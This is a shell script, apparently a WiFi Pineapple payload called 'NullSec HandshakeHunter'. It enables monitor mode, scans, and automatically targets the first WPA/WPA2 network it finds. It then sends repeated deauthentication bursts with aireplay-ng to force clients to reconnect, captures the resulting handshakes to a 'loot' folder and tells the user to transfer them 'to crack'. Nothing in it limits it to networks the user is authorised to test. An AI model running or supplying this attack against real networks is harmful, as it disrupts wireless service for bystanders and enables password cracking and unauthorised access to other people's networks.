#!/bin/sh
# Title: NullSec HandshakeHunter
# Author: bad-antics
# Description: Automated WPA/WPA2 handshake capture
# Category: Recon/Capture
# Version: 1.0
# GitHub: https://github.com/bad-antics/nullsec-pineapple-suite

LOOT_DIR="/mmc/nullsec/handshakes"
mkdir -p "$LOOT_DIR"

PROMPT "HANDSHAKE HUNTER

Automated WPA handshake
capture with deauth.

Press OK to start."

[ ! -d "/sys/class/net/wlan0" ] && { ERROR_DIALOG "wlan0 not found!"; exit 1; }

SPINNER_START "Enabling monitor mode..."
airmon-ng start wlan0 >/dev/null 2>&1
MON_IF=$(iw dev | grep -oE "wlan[0-9]mon" | head -1)
[ -z "$MON_IF" ] && MON_IF="wlan0mon"
SPINNER_STOP

SPINNER_START "Scanning (20s)..."
timeout 20 airodump-ng "$MON_IF" -w /tmp/hscan --output-format csv 2>/dev/null
SPINNER_STOP

CSV_FILE=$(ls /tmp/hscan*.csv 2>/dev/null | head -1)
[ ! -f "$CSV_FILE" ] && { ERROR_DIALOG "No networks!"; airmon-ng stop "$MON_IF" >/dev/null 2>&1; exit 1; }

TARGET_LINE=$(grep -E "WPA|WPA2" "$CSV_FILE" | head -1)
TARGET_BSSID=$(echo "$TARGET_LINE" | cut -d',' -f1 | tr -d ' ')
TARGET_CH=$(echo "$TARGET_LINE" | cut -d',' -f4 | tr -d ' ')
TARGET_SSID=$(echo "$TARGET_LINE" | cut -d',' -f14 | tr -d ' ')

[ -z "$TARGET_BSSID" ] && { ERROR_DIALOG "No WPA networks!"; airmon-ng stop "$MON_IF" >/dev/null 2>&1; exit 1; }

PROMPT "TARGET: $TARGET_SSID
CH: $TARGET_CH

Capturing...
Press OK."

iwconfig "$MON_IF" channel "$TARGET_CH" 2>/dev/null
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
CAPTURE_FILE="$LOOT_DIR/${TARGET_SSID}_${TIMESTAMP}"

airodump-ng "$MON_IF" --bssid "$TARGET_BSSID" -c "$TARGET_CH" -w "$CAPTURE_FILE" --output-format pcap 2>/dev/null &
CAPTURE_PID=$!
sleep 2

SPINNER_START "Deauthing (60s)..."
for i in 1 2 3 4 5; do
    aireplay-ng -0 5 -a "$TARGET_BSSID" "$MON_IF" >/dev/null 2>&1
    sleep 10
done
SPINNER_STOP

kill $CAPTURE_PID 2>/dev/null

PCAP_FILE=$(ls "${CAPTURE_FILE}"*.cap 2>/dev/null | head -1)
if [ -f "$PCAP_FILE" ]; then
    PROMPT "CAPTURE DONE

File: $PCAP_FILE

Transfer to crack.
Press OK."
else
    ERROR_DIALOG "Capture failed!"
fi

airmon-ng stop "$MON_IF" >/dev/null 2>&1
rm -f /tmp/hscan* 2>/dev/null
exit 0
